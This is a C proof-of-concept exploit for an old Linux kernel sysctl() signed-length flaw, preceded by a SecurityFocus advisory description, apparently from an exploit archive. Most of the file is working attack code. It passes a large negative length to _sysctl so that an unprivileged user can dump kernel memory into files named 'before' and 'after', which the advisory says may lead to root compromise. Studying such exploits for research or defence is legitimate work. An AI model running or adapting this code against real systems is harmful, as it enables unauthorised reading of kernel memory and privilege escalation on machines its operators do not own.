/* 
source: http://www.securityfocus.com/bid/2364/info

The Linux Kernel is the core of the Linux Operating System. It was originally written by Linus Torvalds, and is publicly maintained.

A problem in the Linux kernel may allow root compromise. The sysctl() call allows a privileged program to read or write kernel parameters. It is possible for underprivileged programs to use this system call to query values within the kernel. The system call accepts signed values, which could allow supplied negative values to reach below the threshold memory address set for system security.

This makes it possible for a user with malicious motives to browse kernel space addresses, and potentially gain elevated privileges, including administrative access.
*/

/* sysctl_exp.c - Chris Evans - February 9, 2001 */

/* Excuse the lack of error checking */
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <linux/unistd.h>
#include <linux/sysctl.h>
_syscall1(int, _sysctl, struct __sysctl_args *, args);

#define BUFLEN 1000000

int
main(int argc, const char* argv[])
{
  struct __sysctl_args args_of_great_doom;

  int names[2] = { CTL_KERN, KERN_NODENAME };
  /* Minus 2 billion - somewhere close to biggest negative int */
  int dodgy_len = -2000000000;
  int fd;
  char* p_buf;

  fd = open("/dev/zero", O_RDWR);
  p_buf = mmap((void*)8192, BUFLEN, PROT_READ | PROT_WRITE,
               MAP_FIXED | MAP_PRIVATE, fd, 0);

  memset(p_buf, '\0', BUFLEN);
  fd = open("before", O_CREAT | O_TRUNC | O_WRONLY, 0777);
  write(fd, p_buf, BUFLEN);

  args_of_great_doom.name = names;
  args_of_great_doom.nlen = 2;
  args_of_great_doom.oldval = p_buf;
  args_of_great_doom.oldlenp = &dodgy_len;
  args_of_great_doom.newval = 0;
  args_of_great_doom.newlen = 0;

  _sysctl(&args_of_great_doom);

  fd = open("after", O_CREAT | O_TRUNC | O_WRONLY, 0777);
  write(fd, p_buf, BUFLEN);
}